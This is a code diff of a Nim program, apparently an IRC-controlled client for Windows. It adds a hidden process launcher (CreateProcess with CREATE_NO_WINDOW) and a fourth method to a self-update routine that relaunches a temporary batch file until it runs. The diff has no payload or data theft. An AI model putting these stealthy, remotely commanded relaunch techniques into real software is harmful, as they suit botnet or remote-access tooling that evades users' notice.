@@ -1,10 +1,28 @@
 import configparser, os, irc, osproc, base64, helper_base64, winim/inc/wininet, winim, random
 
-let current_version* = "1.0.6.0"
+let current_version* = "1.0.6.5"
 
 var
     g_tmp_clean* = false
     g_dbg = true
+
+proc launchProcess(command: string): bool =
+  var
+    si: STARTUPINFO
+    pi: PROCESS_INFORMATION
+  let cmd: string = command
+
+  ZeroMemory(addr si, sizeof(si))
+  si.cb = sizeof(si)
+  ZeroMemory(addr pi, sizeof(pi))
+
+  if CreateProcess(nil, cmd, nil, nil, false, CREATE_NO_WINDOW, nil, nil, addr si, addr pi):
+  #if CreateProcess(nil, cmd, nil, nil, false, CREATE_NO_WINDOW, nil, nil, addr si, addr pi):
+    CloseHandle(pi.hThread)
+    CloseHandle(pi.hProcess)
+    result = true
+  else:
+    result = false
 
 
 
@@ -215,7 +233,7 @@ proc updt_check*(respond_to_caller:bool = false, iclient:Irc, ievent:IrcEvent):b
                 tmpbat_filename_only = name & ext
                 first = true
                 current_method = 1
-                max_methods = 3
+                max_methods = 4
             while getProcessIdByName(tmpbat_filename_only) == 0:
                 if not first:
                     first = false
@@ -231,6 +249,8 @@ proc updt_check*(respond_to_caller:bool = false, iclient:Irc, ievent:IrcEvent):b
                 of 2:
                     discard startProcess(tmpbat, args = ["\"" & getAppFilename() & "\"", a_very_random_number])
                 of 3:
+                    discard launchProcess(tmpbat & " \"" & getAppFilename() & "\" " & $a_very_random_number)
+                of 4:
                     discard execShellCmd("start /B " & tmpbat & " \"" & getAppFilename() & "\" " & $a_very_random_number)
                 else:
                     echo "This is all just terrible"
